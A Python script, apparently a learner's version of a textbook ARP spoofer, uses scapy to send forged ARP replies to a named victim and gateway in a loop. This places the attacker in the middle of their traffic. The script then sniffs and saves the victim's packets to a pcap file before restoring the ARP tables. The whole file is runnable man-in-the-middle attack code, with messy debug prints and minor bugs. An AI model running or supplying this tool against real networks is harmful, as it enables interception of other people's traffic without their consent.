from multiprocessing import Process
from scapy.all import (ARP, Ether, conf, get_if_hwaddr, send, sniff, sndrcv, srp, wrpcap)
import os 
import sys
import time 


def get_mac(targetip):
    packet = Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(op='who-has', pdst=targetip) #here boardcast maci s used to send packet to all the data in the networks 
    resp, _ = srp(packet, timeout=2,retry=10, verbose=False)
    for _, r in resp: 
        #here _ contains  the 
        print("this isthe man ", _[ARP])
        print("this isthe man okie  ", r[ARP])
        
        return r[Ether].src # this is giving the mac address 
    return None

class Arper:
    def __init__(self, victim, gateway, interface='wlan0'):
        self.victim = victim
        self.victimmac = get_mac(victim)
        self.gateway = gateway
        self.gatewaymac = get_mac(gateway)
        self.interface = interface
        conf.iface = interface
        conf.verb = 0

        print(f"Initialized {interface}")
        print(f"Gateway ({gateway}) is at {self.gatewaymac}")
        print(f"Victim ({victim}) is at {self.victimmac}")
        print('-'*30)


    def run(self):
        self.poison_thread = Process(target=self.poison)
        self.poison_thread.start()

        self.sniff_thread = Process(target=self.sniff)
        self.sniff_thread.start()
    
    def poison(self): #B this function will cause the arp poisoning in the arp table of the victim and the gateway 
        poison_victim = ARP()
        poison_victim.op = 2 
        print("this is pscr before assign", poison_victim.psrc)
        poison_victim.psrc = self.gateway
        print("this is pdst before assign", poison_victim.pdst)
        poison_victim.pdst = self.victim
        print("this is phwdst before assign", poison_victim.hwdst)
        poison_victim.hwdst = self.victimmac
        print('-'*30)
        print(f'ip src: {poison_victim.psrc}')
        print(f'ip dst: {poison_victim.pdst}')
        print(f'mac dst: {poison_victim.hwdst}')
        print(f'mac src: {poison_victim.hwsrc}')
        print(poison_victim.summary())
        print('-'*30)
        poison_gateway = ARP()
        poison_gateway.op = 2
        print("this is the poision gate way before source ", poison_gateway.psrc)
        poison_gateway.psrc = self.victim
        print("this ithe poison_gateway before destatnion ",poison_gateway.pdst)
        poison_gateway.pdst = self.gateway
        print("this is the  poison gateway is the hwdst before ", poison_gateway.hwdst)
        poison_gateway.hwdst = self.gatewaymac
        print(f'ip src: {poison_gateway.psrc}')
        print(f'ip dst: {poison_gateway.pdst}')
        print(f'mac dst: {poison_gateway.hwdst}')
        print(f'mac_src: {poison_gateway.hwsrc}')
        print(poison_gateway.summary())
        print('-'*30)
        while True:
            sys.stdout.write(".")
            sys.stdout.flush()
            try:
                send(poison_victim)
                send(poison_gateway)
            except KeyboardInterrupt:
                self.restore()
                sys.exit()
            else:
                time.sleep(2)

    def sniff(self, count=200): #this function will captured all the packet since all the packet are comming to the attacker
        time.sleep(5)
        print(f'Sniffing {count} packets')
        print("this is the host : %s " %victim)
        bpf_filter = 'ip host %s' %victim
        packets = sniff(count=count, filter=bpf_filter, iface=self.interface)
        wrpcap('arper.pcap', packets)
        print("got the packets")
        self.restore()
        self.poison_thread.terminate()
        print("Finished")


    def restore(self):
        print("Restoring ARP tables....")
        send(ARP(
            op =2,
            psrc = self.gateway,
            hwsrc = self.gatewaymac,
            pdst=self.victim,
            hwdst='ff:ff:ff:ff:ff:ff',
            count=5,
        ))

        send(ARP(
            op=2,
            psrc=self.victim,
            hwsrc=self.victimmac,
            pdst=self.gateway,
            hwdst='ff:ff:ff:ff:ff:ff',
            count=5
        ))
        


if __name__ == '__main__':
        if len(sys.argv) != 4:
            print("Usage: python script.py <victim_ip> <gateway_ip> <interface>")
            sys.exit(1)


        victim, gateway, interface = sys.argv[1], sys.argv[2], sys.argv[3]
        myarp = Arper(victim, gateway, interface)
        myarp.run()
        # get_mac("192.168.1.64")
